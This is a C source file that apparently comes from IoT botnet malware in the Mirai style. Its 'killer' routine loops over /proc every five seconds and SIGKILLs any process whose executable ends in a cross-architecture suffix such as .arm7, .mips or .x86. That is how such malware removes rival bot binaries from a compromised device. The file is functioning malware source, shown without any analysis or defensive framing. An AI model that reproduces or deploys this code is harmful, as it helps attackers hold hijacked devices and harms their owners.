#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h>
#include <ctype.h>

void killer_exe(void) {
    const char *extensions[] = {".x86", ".x86_64", ".arm", ".arm5", ".arm6", ".arm7", ".mips", ".mipsel", ".sh4", ".ppc"};
    const int num_extensions = sizeof(extensions) / sizeof(extensions[0]);

    while (1) {
        DIR *dir = opendir("/proc");
        struct dirent *entry;

        if (dir == NULL) {
            return;
        }

        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR) {
                int pid = atoi(entry->d_name);
                if (pid != 0) {
                    char exe_path[1024];
                    snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);

                    char target_path[1024];
                    ssize_t target_len = readlink(exe_path, target_path, sizeof(target_path) - 1);
                    if (target_len != -1) {
                        target_path[target_len] = '\0';

                        const char *extension = strrchr(target_path, '.');
                        if (extension != NULL) {
                            for (int i = 0; i < num_extensions; i++) {
                                if (strcmp(extension, extensions[i]) == 0) {
                                    kill(pid, SIGKILL);
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }

        closedir(dir);
        sleep(5);
    }
}


void killer_init() {
  killer_exe();
}
